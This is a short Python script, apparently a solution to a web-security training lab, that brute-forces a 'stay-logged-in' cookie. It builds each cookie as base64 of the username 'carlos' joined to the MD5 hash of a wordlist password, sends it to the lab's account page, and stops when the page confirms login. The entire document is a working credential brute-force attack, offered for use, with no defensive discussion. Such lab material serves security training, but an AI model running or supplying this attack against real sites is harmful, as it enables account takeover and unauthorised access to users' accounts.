# Brute-forcing a stay-logged-in cookie
import requests
import hashlib
import base64

url = "https://0a8e00960411a291c0c9490100d300c1.web-security-academy.net/my-account" # change the url :)
username = "carlos"
passwords = open("passwords.txt", "r").read().splitlines()

for password in passwords:
    print("Trying password: " + password , end="\r")
    stay_logged_in = base64.b64encode((username+":" +hashlib.md5(password.encode()).hexdigest()).encode()).decode()
    session = requests.Session()
    r = session.post(url, cookies={"stay-logged-in": stay_logged_in})
    if f"Your username is: {username}" in r.text:
        print("\nPassword found: " + password)
        print(r.url)
        break
